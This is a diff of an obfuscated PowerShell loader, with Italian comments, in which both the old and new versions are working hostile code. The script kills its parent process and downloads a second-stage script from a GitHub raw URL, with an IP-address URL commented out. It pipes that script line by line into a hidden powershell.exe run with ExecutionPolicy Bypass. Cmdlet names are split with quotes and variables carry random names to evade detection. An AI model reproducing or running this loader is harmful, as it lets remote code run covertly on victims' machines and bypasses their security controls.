@@ -1,40 +1,40 @@
-# 🔥 KIL''L CMD PARENT PROCESS
-$43e6d8941e994875ab5412f3b973d021= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | S''e''l''e''c''t -Expand ParentProcessId) 2>$null
-if ($43e6d8941e994875ab5412f3b973d021) { Stop''-Pr''o''c''e''s''s -Id $43e6d8941e994875ab5412f3b973d021 -Force -ErrorAction SilentlyContinue }
+# 🔥 K''IL''L CMD PARENT PROCESS
+$737eb55b5aea4f149edc55cb47cc4f27= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | S''e''l''e''c''t -Expand ParentProcessId) 2>$null
+if ($737eb55b5aea4f149edc55cb47cc4f27) { St''o''p-''P''ro''c''e''s''s -Id $737eb55b5aea4f149edc55cb47cc4f27 -Force -ErrorAction SilentlyContinue }
 
-# $b77d2952d90347f2a6468e9d0aff5d1d = "http://151.61.206.201/second.txt";
-$b77d2952d90347f2a6468e9d0aff5d1d= "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt";
-$da48068809eb4dfbac840aa87b36f09c= (New-Object Net.WebClient).DownloadString($b77d2952d90347f2a6468e9d0aff5d1d);
-$137d917e53f942fc8b637d527d59209f= $da48068809eb4dfbac840aa87b36f09c -split "`r?`n";
+# $57d9366458544fc6a592596e6975eeb1 = "http://151.61.206.201/second.txt";
+$57d9366458544fc6a592596e6975eeb1= "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere/second.txt";
+$4397cf2db37a45da9b9294a105aec288= (New-Object Net.WebClient).DownloadString($57d9366458544fc6a592596e6975eeb1);
+$a3002da78475404195bdebb2d7f60f5f= $4397cf2db37a45da9b9294a105aec288 -split "`r?`n";
 
-$890483db25f04e8aabaf27dad92df2ef= Ne''w-O''bj''ect System.Diagnostics.ProcessStartInfo;
-$890483db25f04e8aabaf27dad92df2ef.FileName = "powershell.exe";
-$890483db25f04e8aabaf27dad92df2ef.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass";
-$890483db25f04e8aabaf27dad92df2ef.UseShellExecute = $false;
-$890483db25f04e8aabaf27dad92df2ef.RedirectStandardInput = $true;
-$890483db25f04e8aabaf27dad92df2ef.RedirectStandardOutput = $true;
-$890483db25f04e8aabaf27dad92df2ef.RedirectStandardError = $true;
-$890483db25f04e8aabaf27dad92df2ef.CreateNoWindow = $true;
+$a96adb0957644f2184cc50f2645d0cde= N''e''w''-''O''bj''e''c''t System.Diagnostics.ProcessStartInfo;
+$a96adb0957644f2184cc50f2645d0cde.FileName = "powershell.exe";
+$a96adb0957644f2184cc50f2645d0cde.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass";
+$a96adb0957644f2184cc50f2645d0cde.UseShellExecute = $false;
+$a96adb0957644f2184cc50f2645d0cde.RedirectStandardInput = $true;
+$a96adb0957644f2184cc50f2645d0cde.RedirectStandardOutput = $true;
+$a96adb0957644f2184cc50f2645d0cde.RedirectStandardError = $true;
+$a96adb0957644f2184cc50f2645d0cde.CreateNoWindow = $true;
 
-$d4208739afcb42f7a7217d520bd9392c= [System.Diagnostics.Process]::Start($890483db25f04e8aabaf27dad92df2ef);
-S''t''a''r''t''-''S''l''e''e''p -Seconds 1.2;
+$ff10e99b56e643f1a664ad664d9d13bd= [System.Diagnostics.Process]::Start($a96adb0957644f2184cc50f2645d0cde);
+S''tart''-S''leep -Seconds 1.2;
 
 # 1. INIT error handling
-$d4208739afcb42f7a7217d520bd9392c.StandardInput.WriteLine('$d703458ad89e43539cbff604550a9cb4 = "SilentlyContinue"');
-$d4208739afcb42f7a7217d520bd9392c.StandardInput.Flush();
-S''t''a''r''t''-S''l''ee''p -Milliseconds 200;
+$ff10e99b56e643f1a664ad664d9d13bd.StandardInput.WriteLine('$6c1b30882e8843ecacdb442100ad58fd = "SilentlyContinue"');
+$ff10e99b56e643f1a664ad664d9d13bd.StandardInput.Flush();
+St''a''rt''-''S''l''e''ep -Milliseconds 200;
 
 # 2. INVIO script line-by-line
-foreach ($line in $137d917e53f942fc8b637d527d59209f) {
+foreach ($line in $a3002da78475404195bdebb2d7f60f5f) {
     if ($line.Trim()) {
-        $d4208739afcb42f7a7217d520bd9392c.StandardInput.WriteLine($line.TrimEnd());
-        $d4208739afcb42f7a7217d520bd9392c.StandardInput.Flush();
-        Sta''rt-''Slee''p -Milliseconds (50..150 | Ge''t''-''R''andom);
+        $ff10e99b56e643f1a664ad664d9d13bd.StandardInput.WriteLine($line.TrimEnd());
+        $ff10e99b56e643f1a664ad664d9d13bd.StandardInput.Flush();
+        S''t''a''r''t''-S''le''e''p -Milliseconds (50..150 | Get''-''R''a''n''d''o''m);
     }
 }
 
 # 🔥 CRITICO: TRIGGER FINALE - ESEGUE tutto!
-$d4208739afcb42f7a7217d520bd9392c.StandardInput.WriteLine('');  # Nuova riga
-$d4208739afcb42f7a7217d520bd9392c.StandardInput.Flush();
-S''ta''rt-''S''l''eep -Milliseconds 500;
+$ff10e99b56e643f1a664ad664d9d13bd.StandardInput.WriteLine('');  # Nuova riga
+$ff10e99b56e643f1a664ad664d9d13bd.StandardInput.Flush();
+S''ta''rt''-''Sl''ee''p -Milliseconds 500;
 
